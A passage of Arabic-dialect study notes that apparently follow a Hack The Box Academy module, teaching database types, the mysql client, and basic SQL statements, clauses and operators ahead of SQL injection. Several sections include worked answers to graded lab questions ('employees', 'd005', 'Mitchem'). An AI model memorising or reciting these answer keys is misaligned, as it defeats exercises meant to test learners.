ال user_id وهيك منجيب كلشي معلومات بدون تكرار😎    مثال عن ال query يلي بستخدمها لتنفيذ هالشي:SELECT * FROM posts WHERE user_id=2;      بجدول متل جدول ال Posts ممكن يكون عندي Key تاني متل ID للمنشورات حتى اربطه بجدول ثالث متل جدول التعليقات مثلا.    وهيك باستخدام ال RDBMS منقدر نجيب كل البيانات عن شي عنصر متل منتج او منشور من كل الجداول ب query وحدة وهالشي بخليها سريعة ومضمونة وخاصة بالبيانات الكبيرة واشهر مثال عنها ال MySQL ويلي رح نشرحه اكتر بهالوحدة.    ✅ ملاحظة: بسمي العلاقة بين الجداول جوا قاعدة البيانات ب Schema🟣 Non-relational Databases:    بالنسبة لل Non-relational Databases ويلي بقول عليها كمان NoSQL مابتستخدم الجداول ولا الاعمدة ولا ال Keys ولا حتى ال Schema.    وبدال كل هالأمور بتخزن البيانات بأكتر من طريقة حسب انواع البيانات مشان هيك هي كتير مرنة وبتكون قابلة للتوسع ومناسبة للبيانات يلي مو منظمة بشكل واضح.    انواع التخزين بال NoSQL:  Key-Value  Document-Based  Wide-Column  Graph    كل وحدة من هالأنواع بتخزن البيانات بطريقة شكل يعني على سبيل المثال ال     Key-Value    بتنحفظ البيانات بشكل أزواج (Key-Value) بصيغة JSON او XML      اذا بدي شوف المثال السابق بشي حقيقي اكتر:Json\"100001\": {  \"date\": \"01-01-2021\",  \"content\": \"Welcome to this web application.\"},\"100002\": {  \"date\": \"02-01-2021\",  \"content\": \"This is the first post on this web app.\"},\"100003\": {  \"date\": \"02-01-2021\",  \"content\": \"Reminder: Tomorrow is the ...\"}    هاد الشي بيشبه ال Dictionary بلغات متل ال Python وال PHP وال Key بكون غالباً سلسلة نصية(String) بس ال Value ممكن تكون اي شي ممكن حتى تكون Dictionary تاني.    واشهر شي عندي بال NoSQL هو ال     MongoDB    ✅ ملاحظة:     ال     Non-relational Databases الها طريقة تانية تماماً لل Injection بتختلف عن ال SQL Injection، بالنسبة لل NoSQL Injection رح نحكي عنو بمرات جاية لحال إن شاء الله.وهيك خلصنا قسم جديد وقربنا خطوة🔥اتعلمنا عن انواع قواعد البيانات والفرق بيناتهن ولقدام رح نفهمهم اكتر ونتسحن اكتر، لهيك خليك مبسوط بالتطور يلي عملته🫡وكمل يا وحش✨MySQL📌 Intro to MySQL    بهي الوحدة رح يبلش الجد وحتى نقدر نستغل ال SQL Injection بشكل صحيح لازم نفهم ال SQL, MySQL اكتر، مشان نفهم آلية ال Injection  لهيك بهالقسم رح نحكي اكتر عن اساسيات SQL/MySQL والقواعد الخاصة فيهن، مع شوية امثلة مستخدمة بال MySQL/MariaDB Databases, لهيك يلا يا وحش جهز فنجان القهوة وورقة وقلم وركز معي.⚪ Structured Query Language (SQL):    حكينا سابقاً انو ال SQL هي لغة بتستعمل للتعامل مع ال RDBMS متل ال MySQL أو MariaDB وطبعا في اختلاف بطريقة الكتابة بين كل وحدة والتانية بس كلهن لازم يتبعوا معيار ISO لل SQL يعني حتى لو كان في اختلاف بطريقة الكتابة بس المنطق نفسه، وفينا نستخدمها للأغراض التالية:- جلب البيانات (متل اني استعرض اسماء الزبائن)- تحديث البيانات (متل اني غير عنوان الزبون)- حذف البيانات (متل إزالة طلب)- إنشاء جداول أو قواعد بيانات جديدة- إضافة/إزالة مستخدمين وتحديد صلاحياتهم⚪ Command Line:    منستخدم الأداة         mysql    لتسجيل الدخول والتفاعل مع قاعدة البيانات MySQL/MariaDB، منستخدم الرمز -u لإدخال اسم المستخدم والرمز -p لإدخال كلمة السر، بس طبعا ما مندخل كلمة السر مباشرة بال Command مشان ما تنحفظ بال bash_history، لهيك لأمان اكثر منترك كلمة السر فاضية وبس يطلبها مندخلها:Intro to MySQLFarouk9423@htb[/htb]$ mysql -u root -pEnter password: &lt;password&gt;...SNIP...mysql&gt;    وهيك بتنطلب كلمة السر بعد ما نفذ الأمر وهيك بضمن انها ما رح تنحفظ.    برجع بكرر انو ممكن اني حط كلمة السر مباشرة بالأمر بس هالشي رح يكون مو آمن متل هيك:Intro to MySQLFarouk9423@htb[/htb]$ mysql -u root -p(password)...SNIP...mysql&gt;  ✅ ملاحظة:   ما لازم اترك مسافة بين ال -p وكلمة السر.    بالأمثلة السابقة سجلنا دخول ك superuser يعني       root  باستخدام كلمة سر، وهاد الشي بيعطيني صلاحيات لتنفيذ كل الأوامر  أما المستخدمين الآخرين فبكون عندهن صلاحيات محدودة لتنفيذ الأوامر، وحتى شوف كلشي صلاحيات عندي بستخدم أمر SHOW GRANTS ويلي رح نحكي عنو اكتر شوي تانية.      لما ما بحدد اي host، فهو بيتصل تلقائيا على ال       localhost server       ومنقدر نتصل على سيرفر بعيد بتحديد ال host وال port باستخدام:Intro to MySQLFarouk9423@htb[/htb]$  mysql -u root -h docker.hackthebox.eu -P 3306 -p Enter password: &lt;password&gt;...SNIP...mysql&gt;  ✅ ملاحظة:   ال Port الافتراضي ل MySQL/MariaDB هو 3306 بس ممكن يتغير من الأعدادات ل Port تاني لهيك بحدد ال Port بالرمز -P على عكس كلمة السر يلي بحددها بالرمز -p.⚪ Creating a database:    بعد ما تسجل دخول لقاعدة البيانات باستخدام اداة mysql، منقدر نستخدم اوامر SQL للتعامل مع قاعدة البيانات مثلا:    مشان ننشئ قاعدة بيانات جديدة في MySQL منستخدم امر     CREATE DATABASE Intro to MySQLmysql&gt; CREATE DATABASE users;Query OK, 1 row affected (0.02 sec)    هاد الأمر بينشئ قاعدة بيانات اسمها users. وأهم شي لا تنسى الفاصلة المنقوطة (;) عقدة المبرمجين😂    وبعدين بعمل عرض لكل قواعد البيانات يلي موجودين عندي بأمر SHOW DATABASES ، وبس بدي اختار قاعدة البيانات يلي بدي ياها بكتب امر USE وثم اسم قاعدة البيانات، متل الموضح بالمثال:Intro to MySQLmysql&gt; SHOW DATABASES;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                || users              |+--------------------+&lt;/span&gt;mysql&gt; USE users;Database changed      ✅ ملاحظة:     اوامر ال SQL غير حساسة لحالة الأحرف، يعني فيني استخدم use users او USE users بس اسم قاعدة البيانات حساس لحالة الأحرف يعني USE USERS غير USE users⚪ Tables:    نظام ال DBMS بخزن البيانات على شكل جداول، وكل جدول فيه:- صفوف(أفقية): بتمثل السجلات- أعمدة(عمودية): بتمثل خصائص كل سجل- تقاطع الصف مع العمود منسميه خليةكل جدول بينشأ بعدد ثابت من الأعمدة وكل عمود عنده نوع محدد من البيانات مثل (أرقام،نصوص،تواريخ...)مثلا بال MySQL الأنواع المشهورة هي:- INT : للأرقام الصحيحة- VARCHAR(n) :للنصوص والحرف n بحدد اكبر عدد ممكن دخله من المحارف.- DATETIME :للتواريخ والوقت. حتى انشئ جدول بستخدم امر CREATE TABLE:SQL  CREATE TABLE logins (    id INT,    username VARCHAR(100),    password VARCHAR(100),    date_of_joining DATETIME    );Intro to MySQLmysql&gt; CREATE TABLE logins (&gt; id INT,&gt; username VARCHAR(100),&gt; password VARCHAR(100),&gt; date_of_joining DATETIME&gt; );Query OK, 0 rows affected (0.03 sec)     وهيك عملنا جدول اسمه logins موجود فيه 4 اعمدة:    - id :     رقم صحيح    - password, username :     نصوص وبحد اقصى بقدر دخل 100 محرف واي ادخال اطول من هيك رح يسببلي Error    - date_of_joining :     تاريخ ووقت    وفيني اعرض قائمة بالجداول الموجودة عندي بالأمر SHOW TABLES Intro to MySQLmysql&gt; SHOW TABLES;+-----------------+| Tables_in_users |+-----------------+| logins          |+-----------------+1 row in set (0.00 sec)  واذا بدي شوف الجدول مع الأعمدة وأنواعها بكتب امر  DESCRIBE:Intro to MySQLmysql&gt; DESCRIBE logins;+-----------------+--------------+| Field           | Type         |+-----------------+--------------+| id              | int          || username        | varchar(100) || password        | varchar(100) || date_of_joining | date         |+-----------------+--------------+4 rows in set (0.00 sec)  مع امر  CREATE TABLE  منقدر نحدد خصائص للأعمدة، يعني فيني خلي ال id يزيد تلقائيا كل مرة باستخدام   AUTO_INCREMENT  وهيك بضمن انو ال id كل مرة بزيد واحد بشكل تلقائي:SQL  id INT NOT NULL AUTO_INCREMENT,  وبقدر كمان ضيف   NOT NULL   وهيك بضمن انو ممنوع اترك اي عمود فاضي واذا ضل فاضي بيطلع ايرور بوجهي، وكمان فيني استخدم امر  UNIQE  حتى اضمن انو القيمة دائما فريدة ومو مستخدمة قبل، يعني اذا استخدمتها مع عمود ال username، فهيك بضمن انو ماعندي تنين بنفس الأسم:SQL  username  INT UNIQUE VARCHAR(100),  وكمان عندي ال  DEFAULT  وبستخدمها حتى حدد القيمة الأفتراضية، يعني مثلا بعمود   date_of_joining  فينا نحط القيمة الافتراضية هي Now() وال MySQL بتحولها للوقت والتاريخ الحالي وقت التنفيذ:SQL  date_of_joining DATETIME DEFAULT NOW(),  آخر واهم خاصية عندي هي ال   PRIMARY KEY  ويلي بستخدمه لتحديد كل صف بشكل فريد، يعني مافي سجلين بالجدول بكون الهم نفس قيمة ال Primary Key، والهدف منه اني اقدر ميز كل سجل عن التاني بسهولة متل ماشرحنا قبل عن ربط الجداول، ورح نشوف هالشي بالأمثلة لقدامSQL   PRIMARY KEY (id)  كيف بتطلع ال Query بشكل كامل:SQL  CREATE TABLE logins (    id INT NOT NULL AUTO_INCREMENT,    username VARCHAR(100) UNIQUE NOT NULL,    password VARCHAR(100) NOT NULL,    date_of_joining DATETIME DEFAULT NOW(),    PRIMARY KEY (id)      );    ✅ ملاحظة: السيرفرات (مثل Apache/MySQL) بتحتاج 10-15 ثانية عشان تبدأ، فانتظر شوية قبل ما تجرب الأوامر.  HTB Questions:Answer the question(s) below to complete this Section and earn cubes!Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?     Answer: employees    📌 SQL Statementsبالقسم هاد رح نحكي عن اوامر SQL ونشوف كيف بدنا ندخل معلومات على الجداول او نحذف او حتى نعدل، كل شوي عم تصير الدروس اهم واهم لهيك غسل وجهك وركز منيح يابطل🔥🟡 INSERT Statement:  اتعلمنا قبل كيف نستخدم اداة ال mysql وانشأنا قواعد بيانات وجداول، خلينا نشوف هلق أمر مهم من أوامر ال SQL ويلي هو  INSERT.  بعد ما انشأنا قاعدة البيانات وانشأنا جداول داخلها، صار الوقت لنعبي معلومات داخل هالجداول، امر INSERT بسمحلي ضيف صفوف جديدة بالجداول يلي عندي بالشكل التالي:SQLmysql&gt; INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');Query OK, 1 row affected (0.00 sec)  بهاد المثال ضفنا سطر جديد على جدول logins وحطينا البيانات الخاصة بكل عمود بالتريب.  طيب بلكي عندي اعمدة بدي اتركهن فاضيين وبدي حط مثلا بس ال username , password؟  ساعتها رح اكتب الأمر بهالطريقة:🫠SQLmysql&gt;  INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');Query OK, 1 row affected (0.00 sec)    ✅ ملاحظة:   اني اترك الأعمدة يلي هي \"NOT NULL\" فاضية رح يسببلي Errors    ✅ ملاحظة:   بتقدر تضيف اكتر من سطر ورا بعض باستخدام ال ,SQLmysql&gt;  INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');Query OK, 2 rows affected (0.00 sec)Records: 2  Duplicates: 0  Warnings: 0  هون نحنا بس ادخلنا ال username , password واتخطينا ال id لانو رح يتولد تلقائياً بسبب ال AUTO_INCREMENT، اما ال date_of_joining فرح تاخد القيمة الافتراضية يلي هي now    ✅ ملاحظة: بالأمثلة ادخلنا كلمة السر بشكل نص وهاد الشي على ارض الواقع مو آمن ابدا، الافضل اني اعملها Hash وهو نوع من التشفير بعدين احفظها.🟡 SELECT Statement:  بعد ما استخدمنا امر INSERT وضفنا البيانات عالجداول، صار وقت نشوف كيف بدنا نستعرض هالبيانات ونشوفها يعني مو معقول خزن البيانات بدون ما ارجع شوفها🌚، لهيك لنرجع نعرض البيانات يلي بالجدول رح نستخدم امرSELECT، والأمر هاد من اهم اوامر SQL ورح نعرف ليش بعدين.بس بشكل عام اذا بدك تشوف البيانات يلي مخزنها بالجداول رح تستخدم الأمر بهالطريقة:SQL  SELECT * FROM اسم الجدول;    أمر SELECT ليقرأ البيانات، اما رمز النجمة * فمعناه انو اقرأ كل الأعمدة من هاد الجدول.  طيب لنفرض انو مابدي كل الأعمدة وبدي عدد محدد من الأعمدة فبحددهن بدال النجمة:SQL  SELECT column1, column2 FROM اسم الجدول;  SQLmysql&gt; SELECT * FROM logins;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  3 | john          | john123!   | 2020-07-02 11:47:16 ||  4 | tom           | tom123!    | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+4 rows in set (0.00 sec)mysql&gt; SELECT username,password FROM logins;+---------------+------------+| username      | password   |+---------------+------------+| admin         | p@ssw0rd   || administrator | adm1n_p@ss || john          | john123!   || tom           | tom123!    |+---------------+------------+4 rows in set (0.00 sec)🟡 SELECT DROP:  منستخدم الأمر   DROP   لنحذف جدول أو قاعدة بيانات من ال Server بشكل نهائي، يعني لما بستخدم هاد الأمر على جدول او قاعدة بيانات بينحذف بشكل نهائي مع البيانات يلي جواته ومستحيل اقدر رجعو إلا اذا كان عندي نسخة احتياطية.SQLmysql&gt; DROP TABLE logins;Query OK, 0 rows affected (0.01 sec)mysql&gt; SHOW TABLES;Empty set (0.00 sec)🟡 ALTER DROP:  هاد الأمر منستخدمه حتى نغير بهيكيلية الجدول الموجود، يعني اذا بدنا نغير اسم الجدول، او نضيف عمود جديد، او نحذف عمود، او حتى انو نغير اسم عمود موجود رح نستخدم   ALTER   هو متل اداة لصيانة الجدول😅   فينا نستخدمه لإضافة اعمدة مع الأمر   ADD:SQLmysql&gt; ALTER TABLE logins ADD newColumn INT;Query OK, 0 rows affected (0.01 sec)  وكمان بقدر غير اسم عمود موجود بأمر   RENAME COLUMN:mysql&gt; ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;Query OK, 0 rows affected (0.01 sec)  وبقدر حتى اني عدل ال Datatype تبع الأعمدة الموجودة باستخدام    MODIFY:mysql&gt; ALTER TABLE logins MODIFY newerColumn DATE;Query OK, 0 rows affected (0.01 sec)  واخيرا بقدر اني احذف عمود بشكل نهائي اذا بستخدم امر   DROP:mysql&gt; ALTER TABLE logins DROP newerColumn;Query OK, 0 rows affected (0.01 sec)    ✅ ملاحظة: بقدر استخدم اي وحدة من الأوامر يلي فوق طول ما معي الصلاحيات الكافية.🟡 UPDATE DROP:  بالنسبة لأمر   UPDATE   فهو بيشبه شوي ال ALTER، بس الفرق انو ALTER بعدل على الاعمدة والهيكلية تبع الجدول، بينما UPDATE بعدل القيم داخل الجدول(الصفوف).   يعني مثلا عندي عمود فيه اسماء السناغل، وحطيت اسمك يا عزيزي القارئ (لانو لو عندك حدا تحكي معو ماكنت ضيعت وقتك هون🫠)، بأمر UPDATE بقدر غير بقدر غير اسمك وقت ترتبط نشالله ونفرحلك ويضل اسمي لحالي.   بينما ال ALTER بغير العمود كلو وبخليه اسماء المرتبطين مثلا🌚   وبستخدمه بهالطريقة:SQL  UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE __condition__;    الفكرة اني بحط امر UPDATE بعدين بحط اسم الجدول اما بالنسبة ل SET فهو بحدد شو هي الأعمدة يلي بدي غير القيم تبعها وشو هي القيم الجديدة، وآخر الشي بستخدم WHERE حتى حط اذا عندي شرط للتغيير واذا ماحطيته رح يتغير الكل.  مثال عملي، لنفرض عندي هاد الجدول:SQLmysql&gt; UPDATE logins SET password = 'change_password' WHERE id &gt; 1;Query OK, 3 rows affected (0.00 sec)Rows matched: 3  Changed: 3  Warnings: 0mysql&gt; SELECT * FROM logins;+----+---------------+-----------------+---------------------+| id | username      | password        | date_of_joining     |+----+---------------+-----------------+---------------------+|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 ||  2 | administrator | change_password | 2020-07-02 11:30:50 ||  3 | john          | change_password | 2020-07-02 11:47:16 ||  4 | tom           | change_password | 2020-07-02 11:47:16 |+----+---------------+-----------------+---------------------+4 rows in set (0.00 sec)  ال Query السابقة بدلت كلمات السر لكل السجلات يلي ال id تبعها اكبر من 1 ل change_password  HTB Questions:  Answer the question(s) below to complete this Section and earn cubes!  What is the department number for the 'Development' department?   Answer: d005  اول شي اتصلت على قاعدة البيانات وعرضت كلشي DATABASESmysql -u root -h &lt;Target system IP&gt; -P &lt;Port Namber&gt; -pSHOW DATABASES;    بعدين اخترتها واستعرضت كلشي جداول فيها حتى لقيت ال departmentsUSE employees;SHOW TABLES;    آخر شي عرضت كلشي موجود جوا هالقاعدة البياناتSELECT * FROM departments;  📌 Query Results  بهالقسم رح نشوف كيف فينا نتحكم بالنتائج يلي يلي بتطلع من ال Quries، بستخدم الأمر   ORDER BY  مشان رتب نتائج الاستعلام من عمود معين.SQLmysql&gt; SELECT * FROM logins ORDER BY password;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  3 | john          | john123!   | 2020-07-02 11:47:16 ||  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  4 | tom           | tom123!    | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+4 rows in set (0.00 sec)  وهيك رتبنا النتائج حسب عمود  Password  بشكل تصاعدي من A الى Z.SQLmysql&gt; SELECT * FROM logins ORDER BY password DESC;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 ||  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  3 | john          | john123!   | 2020-07-02 11:47:16 ||  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |+----+---------------+------------+---------------------+4 rows in set (0.00 sec)  وهون رتبناهن بشكل تنازلي من Z الى A.  واذا عندي قيم مكررة بقدر رتبهن حسب عمود تاني بهالطريقة:SQLmysql&gt; SELECT * FROM logins ORDER BY password DESC, id ASC;+----+---------------+-----------------+---------------------+| id | username      | password        | date_of_joining     |+----+---------------+-----------------+---------------------+|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 ||  2 | administrator | change_password | 2020-07-02 11:30:50 ||  3 | john          | change_password | 2020-07-02 11:47:16 ||  4 | tom           | change_password | 2020-07-02 11:50:20 |+----+---------------+-----------------+---------------------+4 rows in set (0.00 sec)⚫ LIMIT Results:  بستخدم الأمر   LIMIT  مشان حدد عدد السجلات يلي بدي شوفها من النتائج وخاصة اذا كان الجدول فيو كتير Data.SQLmysql&gt; SELECT * FROM logins LIMIT 2;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |+----+---------------+------------+---------------------+2 rows in set (0.00 sec)  واذا بدي حط نقطة بداية (Offset) ابدأ منها مشان ما يبدألي من الأول بعمل هيك:SQLmysql&gt; SELECT * FROM logins LIMIT 1, 2;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  3 | john          | john123!   | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+2 rows in set (0.00 sec)    ✅ ملاحظة:     ال Offset بتبدأ من ال 0 فانا هون اخدت السجل رقم 2 و 3⚫ WHERE Clause:  بستخدمWHEREمع امر SELECT مشان فلتر البحث بناء على شرط معين وما طلع كلشي نتائج عندي، يعني مثلا بدي كل الموظفين يلي بلشو شغل بعد تاريخ محدد او بدي يلي ال id تبعهن اكبر من عدد محدد وكتير غير امثلة...SQLmysql&gt; SELECT * FROM logins WHERE id &gt; 1;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  3 | john          | john123!   | 2020-07-02 11:47:16 ||  4 | tom           | tom123!    | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+3 rows in set (0.00 sec)انا طلبت كل العالم يلي ال id تبعهن اكبر من ال1 لهيك اتجاهل اول idSQLmysql&gt; SELECT * FROM logins where username = 'admin';+----+----------+----------+---------------------+| id | username | password | date_of_joining     |+----+----------+----------+---------------------+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |+----+----------+----------+---------------------+1 row in set (0.00 sec)    ✅ ملاحظة: النصوص او التواريخ لازم حطهن جوا علامات تنصيص مثل ('admin') اما الأرقام فمو بحاجة⚫ LIKE Clause:  امرLIKEبستخدمه مع الشرط WHERE مشان ابحث عن نمط معين بالنصوص، يعني لو بدك تدور على شي بيشبه كلمة معينة فمنقدر نستخدمه، يعني مثلا لو بدي دور بالجداول على اي حدا بأسمه في كلمة admin، فبستخدم هالطريقةSQLmysql&gt; SELECT * FROM logins WHERE username LIKE 'admin%';x+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |+----+---------------+------------+---------------------+2 rows in set (0.00 sec)  الـ % معناها أي حروف بعد admin. فالأمر جاب admin و administrator لأنهم بيبدأو بـ admin.  طيب مثلا بدي جيب السجلات يلي ال username تبعها مكون من 3 خانات فبستخدم ال ( _ ) بالشكل التالي:SQLmysql&gt; SELECT * FROM logins WHERE username like '___';+----+----------+----------+---------------------+| id | username | password | date_of_joining     |+----+----------+----------+---------------------+|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |+----+----------+----------+---------------------+1 row in set (0.01 sec)  HTB Questions:  Answer the question(s) below to complete this Section and earn cubes!  What is the last name of the employee whose first name starts with \"Bar\" AND who was hired on 1990-01-01?   Answer: Mitchem  اول شي اتصلت على قاعدة البياناتmysql -u root -h &lt;Target system IP&gt; -P &lt;Port Namber&gt; -p    بعدين اخترتها واستعرضت كلشي جداول فيها USE employees;SHOW TABLES;    بعدين استخدمت امر DESCRIBE على الجدول employees، مشان شوف اسماء الأعمدة يلي داخلها.DESCRIBE employees;    بالنهاية حطيت امر البحث المطلوب مني بحيث ابحث عن ال first_name يلي بيبدأ ب Bar وانضم بتاريخ 1990-01-01SELECT * FROM employees WHERE first_name like 'Bar%' AND hire_date = '1990-01-01';  📌 SQL Operators  احيانا ما بكفي شرط واحد لجلب البيانات من قاعدة البيانات وبحتاج اكتر من شرط بنفس الوقت، وشفنا هالشي بحل السؤال السابق.  بهاد الدرس رح نحكي عن ال Operators وكيف ندمج اكتر من شرط بنفس ال query، والخبر الحلو انو هاد آخر درس SQL ومن الدرس القادم رح نبلش بال Injection😍، لهيك صحصح معي وخلينا نخلص هالدرس بسرعة🔥🟠 AND Operator:  ال And Operator  بياخد شرطين وبرجع قيمة True او   False بناءً على تقييمهمcondition1 AND condition2النتيجة لل And بتكون True فقط اذا كان الشرط الاول والشرط الثاني نتيجتهم True، ولو وحدة بيناتهم False بتطلع النتيجة Falseبعرف مافهمت كتير لهيك خلينا ناخد هالمثال، لو كتبنا هيك بقاعدة البيانات:SQLmysql&gt; SELECT 1 = 1 AND 'test' = 'test';+---------------------------+| 1 = 1 AND 'test' = 'test' |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)mysql&gt; SELECT 1 = 1 AND 'test' = 'abc';+--------------------------+| 1 = 1 AND 'test' = 'abc' |+--------------------------+|                        0 |+--------------------------+1 row in set (0.00 sec)بالمثال الأول طلبنا من قاعدة البيانات تتحقق من إذا ما كان 1 = 1 (صحيح)، وإذا كان النص 'test' = 'test'(كمان صحيح)، النتيجة النهائية من جمعهم بتكون صحيح، القيمة 1 يعني صحيح لانه بال MySQL اي قيمة غير الصفر بتعني صحيح.بالمثال التاني عدلنا شوي عالإستعلام، 1=1 (صحيح) و 'test' = 'abc' (خطأ)، النتيجة كانت خطأ للاستعلام بالكامل(0)  حتى تكون النتيجة صح لازم الشرطين يكونو صح، واذا كان في غلط بواحد النتيجة بتكون خطأ🟠 OR Operator:كمان ال OR Operator بياخد شرطين، بس بتكون النتيجة صحيحة لما واحد على الأقل صح، وما بيشترط على الاثنين انو يكونو صح.  مثال:لو كتبنا استعلام متل هاد:SQLmysql&gt; SELECT 1 = 1 OR 'test' = 'abc';هون بقول تحقق اذا كانت 1 = 1 (صحيحة)، أو إذا كان النص 'test' = 'abc' (خطأ)، فالنتيجة بتكون:SQL+-------------------------+| 1 = 1 OR 'test' = 'abc' |+-------------------------+|                       1 |+-------------------------+يس النتيجة بتكون صحيحة، طيب ليش!السبب يا صديقي أن الشرط الأول 1 = 1 صحيح، واتفقنا انو ال OR بيكتفي بأنو يكون واحد من الشرطين يكون صحيح.طيب لو كتبت ال query التانية بهالطريقة:SQLmysql&gt; SELECT 1 = 2 OR 'test' = 'abc';هون بقول تحقق اذا كانت 2 = 1 (خطأ)، أو إذا كان النص 'test' = 'abc' (خطأ)، فالنتيجة بتكون:SQL+-------------------------+| 1 = 2 OR 'test' = 'abc' |+-------------------------+|                       0 |+-------------------------+لأن الشرطين خطأ، وانا بحاجة واحد صحيح على الأقل حتى اقدر اعتبرها صحيحة.  حتى تكون النتيجة صح لازم شرط واحد على الأقل يكونو صح، واذا كانو كل الشروط خطأ النتيجة بتكون خطأ🟠 NOT Operator:بالنسبة لل NOT Operatorبياخد شرط واحد وبيعكس النتيجة، يعني لو الشرط صحيح برجع نتيجة False, ولو الشرط خطأ برجع النتيجة Trueمثال:لو كتبت استعلام متل هيك:SQLmysql&gt; SELECT NOT 1 = 1;هون عم قله يعطيني عكس نتيجة 1 = 1 ويلي هي صحيحة، فبيعطيني:SQL+-----------+| NOT 1 = 1 |+-----------+|         0 |+-----------+طيب لو كتبت:SQLmysql&gt; SELECT NOT 1 = 2;هون عم قله يعطيني عكس نتيجة 2 = 1 ويلي هي غلط، فبيعطيني:SQL+-----------+| NOT 1 = 2 |+-----------+|         1 |+-----------+  بيعكس نتيجة الشرط: صحيح يصير غلط، وغلط يصير صحيح🟠 Symbol Operator:بلغة ال SQL، بدل ما تستخدم AND, OR, NOT، ممكن تستخدم رموز بديلة:  AND = &amp;&amp;  OR = ||  NOT = !وهي امثلة من الأوامر السابقة باستخدام الرموز:SQLmysql&gt; SELECT 1 = 1 &amp;&amp; 'test' = 'abc';+-------------------------+| 1 = 1 &amp;&amp; 'test' = 'abc' |+-------------------------+|                       0 |+-------------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; SELECT 1 = 1 || 'test' = 'abc';+-------------------------+| 1 = 1 || 'test' = 'abc' |+-------------------------+|                       1 |+-------------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; SELECT 1 != 1;+--------+| 1 != 1 |+--------+|      0 |+--------+1 row in set (0.00 sec)  بالنسبة للرمز =! معناه غير يساوي يعني 1 لا يساوي 1🟠 Operators in queries:خلينا نشوف كيف نستخدم هي ال Operators بقاعدة بيانات حقيقية.لنفترض عنا جدول اسمه logins بيحتوي على بيانات المستخدمين متل id, username, password, date_of_joiningوقررت جيب كل السجلات ما عدا السجلات الخاصة بالمستخدم johnSQLmysql&gt; SELECT * FROM logins WHERE username != 'john';+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 ||  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  4 | tom           | tom123!    | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+3 rows in set (0.00 sec)قاعدة البيانات عرضت كل المستخدمين عدا john.وفرضاً قررت اعرض كل المستخدمين عدا john ويلي ال id تبعهم اكبر من 1:SQLmysql&gt; SELECT * FROM logins WHERE username != 'john' AND id &gt; 1;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 ||  4 | tom           | tom123!    | 2020-07-02 11:47:16 |+----+---------------+------------+---------------------+2 rows in set (0.00 sec)🟠 Multiple Operator Precedence:بلغة ال SQL ممكن استخدم اكثر من Operator بنفس الاستعلام، متل جمع وطرح ومقارنات، و AND, OR, NOT ، بس مو كل ال Operators بتتنفذ بنفس الوقت لانه في ترتيب للأولويات وهو يلي بحدد أي عملية تتنفذ اول والترتيب بكون عالشكل التالي:  القسمة (/)، الضرب (*)، الباقي (%)ء  الجمع (+)، الطرح (-).  عوامل المقارنة (مثل =، &gt;، &lt;، &lt;=، &gt;=، !=، LIKE).  NOT أو !.  AND أو &amp;&amp;.  OR أو ||.أمثلة على الأولوليات:مثلا لو عندي هاد الاستعلام:SELECT * FROM logins WHERE username != 'tom' AND id &gt; 3 - 2;بنفذ اول شي عملية الطرح:3 - 2 = 1بالنسبة لعمليات المقارنة != و &gt; ، هنن التنين الهن نفس الأولوية فبيتنفذوا مع بعض:username != 'tom' بتجيب كل المستخدمين عدا يلي اسمهن tomid &gt; 1 بيجيب كل السجلات اللي رقم المعرف فيها أكبر من 1.بالنهاية ال AND بيربط بيناتهن، ولازم الشرطين يكونو صحيحين عشان يظهر السجل.النتيجة:SQLmysql&gt; SELECT * FROM logins WHERE username != 'tom' AND id &gt; 3 - 2;+----+---------------+------------+---------------------+| id | username      | password   | date_of_joining     |+----+---------------+------------+---------------------+|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 ||  3 | john          | john123!   | 2020-07-03 12:03:57 |+----+---------------+------------+---------------------+2 rows in set (0.00 sec)يعني 